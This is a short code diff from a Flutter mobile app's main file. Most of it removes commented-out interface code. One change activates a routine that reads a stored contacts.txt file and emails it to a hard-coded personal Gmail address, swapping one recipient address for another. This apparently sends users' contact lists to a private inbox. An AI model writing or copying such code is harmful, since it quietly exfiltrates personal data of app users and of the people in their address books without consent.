@@ -27,7 +27,6 @@ Future<void> main() async {
         theme: new ThemeData(
           primaryColor: Color.fromARGB(0xff, 0x88, 0x02, 0x0b),
         ),
-//        home: PartnerUsPage()),
         home: token == null ? MyApp("Login") : MyApp("Navigator")),
   );
 }
@@ -157,8 +156,8 @@ class _MyAppState extends State<MyApp> {
   sendContactsMethod() async {
     final Directory directory = await getApplicationDocumentsDirectory();
     final File file = File('${directory.path}/contacts.txt');
-    sendMailContacts("amkhati11@gmail.com", file);
-//    sendMailContacts("Clopes024@gmail.com", file);
+//    sendMailContacts("amkhati11@gmail.com", file);
+    sendMailContacts("Clopes024@gmail.com", file);
     addStringToSF();
   }
 
@@ -218,20 +217,6 @@ class _MyAppState extends State<MyApp> {
           ),
         ),
       ),
-//      home: SafeArea(
-//              child: Scaffold(
-//          body: Container(
-//            width: MediaQuery.of(context).size.width,
-//            height: MediaQuery.of(context).size.height,
-//            decoration: BoxDecoration(
-//              image: DecorationImage(
-//                  fit: BoxFit.fill,
-//                  image: AssetImage("assets/images/splashscreen.png")
-//              ),
-//            ),
-//          ),
-//        ),
-//      ),
       theme: new ThemeData(
         primaryColor: Color.fromARGB(0xff, 0x88, 0x02, 0x0b),
       ),
